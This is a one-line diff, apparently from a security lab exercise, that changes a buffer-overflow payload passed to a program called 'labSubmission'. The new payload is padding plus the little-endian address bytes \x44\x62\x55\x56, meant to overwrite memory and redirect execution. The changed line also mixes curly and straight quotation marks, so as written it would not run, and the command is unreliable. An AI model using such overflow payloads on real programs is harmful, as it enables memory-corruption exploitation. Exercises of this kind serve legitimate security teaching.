@@ -1,1 +1,1 @@
-./labSubmission $(python3 -c 'print("A"*40+"aaaab")')
+./labSubmission $(python3 -c 'print(“A”*37+"\x44\x62\x55\x56”)’)
